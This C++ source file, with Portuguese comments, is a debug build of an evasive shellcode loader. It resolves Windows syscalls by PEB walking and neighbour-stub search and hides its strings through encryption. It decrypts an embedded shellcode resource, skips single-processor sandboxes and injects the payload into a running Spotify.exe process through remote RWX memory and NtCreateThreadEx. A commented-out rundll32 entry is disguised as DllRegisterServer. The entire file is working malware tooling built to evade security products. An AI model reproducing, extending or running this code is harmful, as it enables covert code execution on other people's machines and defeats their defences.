#include <windows.h>
#include <vector>
#include <string>
#include <cstdio>
#include "header.h"
#include "evasion.h"
#include "strenc.h"
#include "syscalls.h"
#include "resource.h"
#include "sckey.h"

// Debug macros. Toda string de debug passa por ENC(literal) no call site
// pelo macro -> nao vai pra .rdata plaintext.
#define DBG(msg)        printf("[+] %s\n", ENC(msg))
#define DBGF(fmt, ...)  printf("[+] "), printf(ENC(fmt), __VA_ARGS__), printf("\n")
#define ERR(msg)        printf("[!] ERROR: %s\n", ENC(msg))
#define ERRF(fmt, ...)  printf("[!] ERROR: "), printf(ENC(fmt), __VA_ARGS__), printf("\n")

extern "C" SYSCALL_ENTRY g_SyscallTable[SYSCALL_TABLE_SIZE] = { 0 };

extern BOOL InitializeSyscalls();
extern BOOL InitStackSpoofer();
extern DWORD FindProcessByName(const wchar_t* processName);
extern bool injectShellcode(std::vector<uint8_t>& shellcode, HANDLE hProcess, DWORD processId);

DWORD GetSSN(const char* functionName)
{
    // So PEB-walk. Nenhum fallback via IAT (GetModuleHandleW/L"ntdll.dll")
    // pra Echo nao ter string "ntdll.dll" cleartext na memoria do modulo.
    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    if (!hNtdll) {
        return (DWORD)-1;
    }

    BYTE* fn = (BYTE*)PebGetProcAddr(hNtdll, functionName);
    if (!fn) {
        return (DWORD)-1;
    }

    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
        DWORD ssn = *(DWORD*)(fn + 4);
        return ssn;
    }

    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*       dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64*     nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords     = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);

    int alvo = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
        if (_stricmp((char*)(base + names[i]), functionName) == 0) { alvo = (int)i; break; }

    if (alvo < 0) {
        return (DWORD)-1;
    }

    for (int delta = 1; delta < 32; delta++)
    {
        for (int sinal = -1; sinal <= 1; sinal += 2)
        {
            int idx = alvo + (sinal * delta);
            if (idx < 0 || idx >= (int)exp->NumberOfNames) continue;

            BYTE* viz = base + funcs[ords[idx]];
            if (viz[0] == 0x4C && viz[1] == 0x8B && viz[2] == 0xD1 && viz[3] == 0xB8) {
                DWORD calculatedSSN = *(DWORD*)(viz + 4) - (DWORD)(sinal * delta);
                return calculatedSSN;
            }
        }
    }

    return (DWORD)-1;
}

PVOID FindSyscallAddress()
{
    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    if (!hNtdll) return nullptr;

    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*   dos = (IMAGE_DOS_HEADER*)base;
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return nullptr;
    }
    
    IMAGE_NT_HEADERS64* nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return nullptr;
    }

    BYTE* text = base + nt->OptionalHeader.BaseOfCode;
    DWORD size = nt->OptionalHeader.SizeOfCode;

    for (DWORD i = 0; i < size - 2; i++)
        if (text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3) {
            return (PVOID)&text[i];
        }

    return nullptr;
}

BOOL InitializeSyscalls()
{
    DBG("InitializeSyscalls: start");
    PVOID syscallAddr = FindSyscallAddress();
    if (!syscallAddr) { ERR("InitializeSyscalls: FindSyscallAddress failed"); return FALSE; }
    DBGF("InitializeSyscalls: syscall addr @ 0x%p", syscallAddr);

    // decrypta cada nome num buffer local, usa, zera. nenhum
    // cleartext persiste em memoria apos a chamada de GetSSN.
    char nameBuf[48]{};

    #define RESOLVE_ONE(idx, literal) do { \
        ENC_BUF(nameBuf, literal); \
        DWORD _ssn = GetSSN(nameBuf); \
        if (_ssn == (DWORD)-1) { \
            ERRF("InitializeSyscalls: resolve fail idx=%d name=%s", (idx), nameBuf); \
            for (size_t _k = 0; _k < sizeof(nameBuf); ++_k) \
                ((volatile char*)nameBuf)[_k] = 0; \
            return FALSE; \
        } \
        g_SyscallTable[idx].ssn            = _ssn; \
        g_SyscallTable[idx].syscallAddress = syscallAddr; \
        DBGF("InitializeSyscalls: [%d] %s -> SSN 0x%X", (idx), nameBuf, _ssn); \
        for (size_t _k = 0; _k < sizeof(nameBuf); ++_k) \
            ((volatile char*)nameBuf)[_k] = 0; \
    } while (0)

    RESOLVE_ONE(0,  "NtAllocateVirtualMemory");
    RESOLVE_ONE(1,  "NtFreeVirtualMemory");
    RESOLVE_ONE(2,  "NtWriteVirtualMemory");
    RESOLVE_ONE(3,  "NtProtectVirtualMemory");
    RESOLVE_ONE(4,  "NtCreateThreadEx");
    RESOLVE_ONE(5,  "NtOpenProcess");
    RESOLVE_ONE(6,  "NtClose");
    RESOLVE_ONE(7,  "NtQuerySystemInformation");
    RESOLVE_ONE(8,  "NtCreateSection");
    RESOLVE_ONE(9,  "NtMapViewOfSection");
    RESOLVE_ONE(10, "NtUnmapViewOfSection");
    RESOLVE_ONE(11, "NtDelayExecution");
    RESOLVE_ONE(12, "NtOpenThread");

    #undef RESOLVE_ONE
    ScrubEncTLS();
    DBG("InitializeSyscalls: all resolved OK");
    return TRUE;
}

void LoadShellcodeFromBytes(std::vector<uint8_t>& sc)
{
    DBG("LoadShellcode: start");
    HMODULE self = GetModuleHandleW(nullptr);
    HRSRC   r    = FindResourceW(self, MAKEINTRESOURCEW(IDR_SHELLCODE), RT_RCDATA);
    if (!r) { ERR("LoadShellcode: FindResourceW failed - IDR_SHELLCODE nao achado"); return; }
    DWORD   sz = SizeofResource(self, r);
    HGLOBAL g  = LoadResource(self, r);
    if (!g || !sz) { ERRF("LoadShellcode: LoadResource fail g=%p sz=%u", g, sz); return; }
    const uint8_t* p = (const uint8_t*)LockResource(g);
    if (!p) { ERR("LoadShellcode: LockResource failed"); return; }
    DBGF("LoadShellcode: resource size=%u bytes @ 0x%p", sz, p);

    // Reverte XOR com stream de 16 bytes + rol8 do pack_bin.
    sc.resize(sz);
    uint32_t s = kScKey;
    uint8_t stream[16];
    for (int k = 0; k < 16; ++k) {
        s ^= s << 13; s ^= s >> 17; s ^= s << 5;
        stream[k] = (uint8_t)(s & 0xFF);
    }
    for (DWORD i = 0; i < sz; ++i) {
        uint8_t v = p[i];
        v = (uint8_t)((v >> 3) | (v << 5));
        sc[i] = v ^ stream[i & 15];
    }
    DBGF("LoadShellcode: decrypted %zu bytes, first 32 = %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X",
         sc.size(),
         sc[0],sc[1],sc[2],sc[3],sc[4],sc[5],sc[6],sc[7],
         sc[8],sc[9],sc[10],sc[11],sc[12],sc[13],sc[14],sc[15],
         sc[16],sc[17],sc[18],sc[19],sc[20],sc[21],sc[22],sc[23],
         sc[24],sc[25],sc[26],sc[27],sc[28],sc[29],sc[30],sc[31]);

    // DIAGNOSTIC: dump decrypted shellcode em %TEMP%\sc_decrypted.bin
    // compara com shellcode original (Bytes.hpp) ou com o binario antes
    // do pack_bin: se diferir, encoder/decoder nao batem.
    wchar_t tmp[MAX_PATH]{};
    DWORD tlen = GetTempPathW(MAX_PATH, tmp);
    if (tlen) {
        wchar_t path[MAX_PATH]{};
        wcscpy_s(path, tmp);
        wcscat_s(path, L"sc_decrypted.bin");
        HANDLE hf = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD wr = 0;
            WriteFile(hf, sc.data(), (DWORD)sc.size(), &wr, NULL);
            CloseHandle(hf);
            DBGF("LoadShellcode: dumped %u bytes to %%TEMP%%\\sc_decrypted.bin", wr);
        } else {
            ERR("LoadShellcode: CreateFile pra dump falhou");
        }
    }
}

DWORD FindProcessByName(const wchar_t* processName)
{
    DBGF("FindProcess: looking for %S", processName);
    SIZE_T   bufSize = 0x10000;
    PVOID    buf = nullptr;
    NTSTATUS st;
    int      attempts = 0;

    auto freeBuf = [&]() {
        if (buf) {
            PVOID  pb = buf;
            SIZE_T ps = 0;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
            buf = nullptr;
        }
        };

    do {
        attempts++;

        freeBuf();

        SIZE_T allocSize = bufSize;
        st = SysNtAllocateVirtualMemory(GetCurrentProcess(), &buf, 0, &allocSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st)) { ERRF("FindProcess: alloc fail status=0x%X", st); return 0; }

        ULONG returnLen = 0;
        st = SysNtQuerySystemInformation(SystemProcessInformation, buf,
            (ULONG)bufSize, &returnLen);

        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize = (returnLen > bufSize) ? (returnLen + 0x1000) : (bufSize * 2);
            DBGF("FindProcess: buffer too small, retrying with %zu bytes (attempt %d)",
                 bufSize, attempts);
        }

        if (attempts > 10) {
            ERR("FindProcess: too many attempts");
            freeBuf();
            return 0;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) {
        ERRF("FindProcess: NtQuerySystemInformation final status=0x%X", st);
        freeBuf();
        return 0;
    }

    PMY_SYSTEM_PROCESS_INFORMATION info = (PMY_SYSTEM_PROCESS_INFORMATION)buf;
    DWORD pid = 0;

    while (info)
    {
        if (info->ImageName.Buffer && info->ImageName.Length > 0 &&
            _wcsicmp(info->ImageName.Buffer, processName) == 0)
        {
            pid = (DWORD)(ULONG_PTR)info->UniqueProcessId;
            break;
        }

        if (info->NextEntryOffset == 0) break;
        info = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)info + info->NextEntryOffset);
    }

    freeBuf();
    return pid;
}
bool enumerateThreadsViaSyscall(DWORD targetPID, std::vector<DWORD>& threadIds)
{
    ULONG   bufSize = 0x10000;
    PVOID   buf     = nullptr;
    NTSTATUS st;

    do {
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        
        PVOID allocBase = nullptr;
        SIZE_T allocSize = bufSize;
        st = SysNtAllocateVirtualMemory(GetCurrentProcess(), &allocBase, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (!NT_SUCCESS(st)) {
            return false;
        }
        
        buf = allocBase;

        st = SysNtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &bufSize);
        
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH && bufSize < 0x1000000);

    if (!NT_SUCCESS(st)) {
        if (buf) {
            PVOID pb = buf;
            SIZE_T ps = bufSize;
            SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
        }
        return false;
    }

    PMY_SYSTEM_PROCESS_INFORMATION procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)buf;

    while (procInfo)
    {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == targetPID)
        {
            PMY_SYSTEM_THREAD_INFORMATION threadInfo = (PMY_SYSTEM_THREAD_INFORMATION)(procInfo + 1);
            
            for (ULONG i = 0; i < procInfo->NumberOfThreads; i++)
            {
                DWORD tid = (DWORD)(ULONG_PTR)threadInfo[i].ClientId.UniqueThread;
                threadIds.push_back(tid);
            }

            if (buf) {
                PVOID pb = buf;
                SIZE_T ps = bufSize;
                SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
            }
            return threadIds.size() > 0;
        }

        if (procInfo->NextEntryOffset == 0) break;
        procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)procInfo + procInfo->NextEntryOffset);
    }

    if (buf) {
        PVOID pb = buf;
        SIZE_T ps = bufSize;
        SysNtFreeVirtualMemory(GetCurrentProcess(), &pb, &ps, MEM_RELEASE);
    }
    return false;
}

HANDLE openThreadViaSyscall(DWORD threadId)
{
    MY_CLIENT_ID clientId;
    ZeroMemory(&clientId, sizeof(clientId));
    clientId.UniqueProcess = NULL;
    clientId.UniqueThread = (HANDLE)(ULONG_PTR)threadId;

    MY_OBJECT_ATTRIBUTES objAttr;
    ZeroMemory(&objAttr, sizeof(objAttr));
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = NULL;
    objAttr.Attributes = 0;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    HANDLE hThread = NULL;
    NTSTATUS st = SysNtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &clientId);
    
    if (NT_SUCCESS(st) && hThread) {
        return hThread;
    } else {
        return NULL;
    }
}

bool injectViaExistingThread(std::vector<uint8_t>& sc, HANDLE hProcess, HANDLE hExistingThread)
{
    DBGF("inject: enter hProcess=0x%p hThread=0x%p sc.size=%zu",
         hProcess, hExistingThread, sc.size());

    SIZE_T scSz = ((sc.size() + 0xFFF) & ~0xFFF);
    if (scSz < 0x1000) scSz = 0x1000;
    DBGF("inject: aligned scSz=%zu", (size_t)scSz);

    HANDLE hScSec = NULL;
    PVOID  scBase = SectionAllocRemote(hProcess, scSz, PAGE_EXECUTE_READWRITE, &hScSec);
    DBGF("inject: SectionAllocRemote scBase=0x%p hScSec=0x%p", scBase, hScSec);

    if (!scBase)
    {
        DBG("inject: section failed, fallback NtAllocateVirtualMemory");
        NTSTATUS st = SysNtAllocateVirtualMemory(hProcess, &scBase, 0, &scSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(st)) {
            ERRF("inject: NtAllocateVirtualMemory fail status=0x%X", st);
            return false;
        }
        DBGF("inject: private alloc @ 0x%p", scBase);
    }

    JitterDelay(10, 30);

    std::vector<uint8_t> wrapper;
    wrapper.resize(sc.size() + 16);
    memcpy(wrapper.data(), sc.data(), sc.size());

    wrapper[sc.size()] = 0xEB;
    wrapper[sc.size() + 1] = 0xFE;
    for (size_t i = sc.size() + 2; i < wrapper.size(); i++) {
        wrapper[i] = 0x90;
    }
    DBGF("inject: wrapper preparado %zu bytes (sled EB FE no offset %zu)",
         wrapper.size(), sc.size());

    SIZE_T written = 0;
    NTSTATUS st = SysNtWriteVirtualMemory(hProcess, scBase, wrapper.data(), wrapper.size(), &written);
    if (!NT_SUCCESS(st)) {
        ERRF("inject: NtWriteVirtualMemory fail status=0x%X written=%zu", st, (size_t)written);
        return false;
    }
    DBGF("inject: write OK, %zu bytes escritos em 0x%p", (size_t)written, scBase);

    JitterDelay(10, 30);

    HANDLE hThread = NULL;
    DBG("inject: creating thread remote");
    NTSTATUS st2 = SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                       hProcess, scBase, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(st2)) {
        ERRF("inject: NtCreateThreadEx fail status=0x%X", st2);
        return false;
    }
    DBGF("inject: thread criada hThread=0x%p, aguardando 500-1000ms", hThread);

    JitterDelay(500, 1000);

    SysNtClose(hThread);
    DBG("inject: SUCCESS");
    return true;
}

bool injectShellcode(std::vector<uint8_t>& sc, HANDLE hProcess, DWORD processId)
{
    DBGF("injectShellcode: pid=%u sc.size=%zu", processId, sc.size());

    std::vector<DWORD> threadIds;
    if (!enumerateThreadsViaSyscall(processId, threadIds)) {
        ERR("injectShellcode: enumerateThreads failed");
        return false;
    }
    DBGF("injectShellcode: encontradas %zu threads", threadIds.size());

    if (threadIds.empty()) { ERR("injectShellcode: zero threads"); return false; }

    // tenta em sequencia: parar na primeira que injetar OK
    for (size_t i = 0; i < threadIds.size(); i++) {
        DBGF("injectShellcode: tentando tid=%u (%zu/%zu)",
             threadIds[i], i + 1, threadIds.size());
        HANDLE hThread = openThreadViaSyscall(threadIds[i]);
        if (!hThread) {
            DBGF("injectShellcode: openThread falhou tid=%u, prox", threadIds[i]);
            continue;
        }
        DBGF("injectShellcode: tid=%u aberto hThread=0x%p", threadIds[i], hThread);
        bool result = injectViaExistingThread(sc, hProcess, hThread);
        SysNtClose(hThread);
        if (result) {
            DBGF("injectShellcode: tid=%u SUCCESS", threadIds[i]);
            return true;
        }
        DBGF("injectShellcode: tid=%u falhou, prox", threadIds[i]);
    }

    ERR("injectShellcode: todas as threads falharam");
    return false;
}

BOOL ExecuteInjectionHijack(HWND hwnd)
{
    (void)hwnd;
    DBG("=== ExecuteInjectionHijack: START ===");

    // anti-sandbox: maquina real tem >= 2 processadores
    DWORD nProc = PebGetNumberOfProcessors();
    DBGF("ExecuteInjection: nProc = %u", nProc);
    if (nProc < 2) { ERR("ExecuteInjection: sandbox detect (nProc < 2)"); return FALSE; }

    DBG("ExecuteInjection: calling InitializeSyscalls");
    if (!InitializeSyscalls()) { ERR("ExecuteInjection: InitializeSyscalls FAIL"); return FALSE; }

    DBG("ExecuteInjection: calling InitStackSpoofer");
    if (!InitStackSpoofer())   { ERR("ExecuteInjection: InitStackSpoofer FAIL"); return FALSE; }

    DBG("ExecuteInjection: calling LoadShellcodeFromBytes");
    std::vector<uint8_t> sc;
    LoadShellcodeFromBytes(sc);
    if (sc.empty()) { ERR("ExecuteInjection: shellcode VAZIO"); return FALSE; }
    DBGF("ExecuteInjection: shellcode %zu bytes carregado", sc.size());

    DBG("ExecuteInjection: procurando Spotify.exe");
    DWORD pid = FindProcessByName(WENC(L"Spotify.exe"));
    ScrubEncTLS();
    if (!pid) { ERR("ExecuteInjection: Spotify.exe NAO ENCONTRADO (abre o Spotify primeiro)"); return FALSE; }
    DBGF("ExecuteInjection: Spotify.exe PID = %u", pid);

    HANDLE hProcess = NULL;
    MY_CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    MY_OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);

    DBG("ExecuteInjection: NtOpenProcess");
    NTSTATUS st = SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
    if (!NT_SUCCESS(st) || !hProcess) {
        ERRF("ExecuteInjection: NtOpenProcess fail status=0x%X hProcess=0x%p", st, hProcess);
        return FALSE;
    }
    DBGF("ExecuteInjection: hProcess = 0x%p", hProcess);

    DBG("ExecuteInjection: chamando injectShellcode");
    bool bResult = injectShellcode(sc, hProcess, pid);
    DBGF("ExecuteInjection: injectShellcode retornou %s", bResult ? "TRUE" : "FALSE");

    // zera o blob do shellcode no nosso heap depois de injetado.
    DBG("ExecuteInjection: scrub shellcode local");
    if (!sc.empty()) {
        volatile uint8_t* p = sc.data();
        for (size_t i = 0; i < sc.size(); ++i) p[i] = 0;
        std::vector<uint8_t>().swap(sc);
    }

    DBG("ExecuteInjection: Sleep 2s pra observar...");
    Sleep(2000);
    SysNtClose(hProcess);
    ScrubEncTLS();
    DBG("=== ExecuteInjectionHijack: END ===");
    return bResult;
}

// rundll32.exe Inject.dll,Start
// =============================================================================
// Entry via rundll32.exe <dll>,Start
//
// rundll32 chama a export com assinatura:
//     void CALLBACK Start(HWND, HINSTANCE, LPSTR cmdline, int nCmdShow)
// =============================================================================
//static volatile LONG g_started = 0;
//
//static DWORD WINAPI StartThread(LPVOID)
//{
//    ExecuteInjectionHijack(nullptr);
//    return 0;
//}
//
//// nome do export disfarçado de API COM-like.
//// chamar via: rundll32.exe Inject.dll,DllRegisterServer
//extern "C" __declspec(dllexport)
//void CALLBACK DllRegisterServer(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
//{
//    UNREFERENCED_PARAMETER(hwnd);
//    UNREFERENCED_PARAMETER(hinst);
//    UNREFERENCED_PARAMETER(lpszCmdLine);
//    UNREFERENCED_PARAMETER(nCmdShow);
//
//    // single-shot: segundo rundll32 na mesma sessao e no-op
//    if (InterlockedCompareExchange(&g_started, 1, 0) != 0) return;
//
//    // worker em thread propria pra devolver ao rundll32 rapido.
//    HANDLE h = CreateThread(nullptr, 0, StartThread, nullptr, 0, nullptr);
//    if (!h) return;
//
//    WaitForSingleObject(h, INFINITE);
//    CloseHandle(h);
//}
//
//BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID)
//{
//    if (reason == DLL_PROCESS_ATTACH) {
//        DisableThreadLibraryCalls(hModule);
//    }
//    return TRUE;
//}

int main()
{
    // console pra debug local
    AllocConsole();
    FILE* fp;
    // nao usar ENC() em args multiplos da mesma call: tls_buf eh unico e
    // os dois ENC() sobrescrevem um ao outro -> CRT dispara
    // _invalid_parameter. "CONOUT$"/"w" sao strings genericas do CRT.
    freopen_s(&fp, "CONOUT$", "w", stdout);
    freopen_s(&fp, "CONOUT$", "w", stderr);
    // tira o buffer pra ver output em tempo real (nao perdemos ultima
    // linha se Spotify crashar e levar o loader junto)
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    printf("%s", ENC("\n========================================\n"));
    printf("%s", ENC(" loader - debug build\n"));
    printf("%s", ENC("========================================\n\n"));

    DBG("main: start");

    BOOL result = ExecuteInjectionHijack(NULL);

    if (result) DBG("main: SUCCESS");
    else        ERR("main: FAIL");

    printf("%s", ENC("\npress any key to exit\n"));
    getchar();

    return result ? 0 : 1;
}
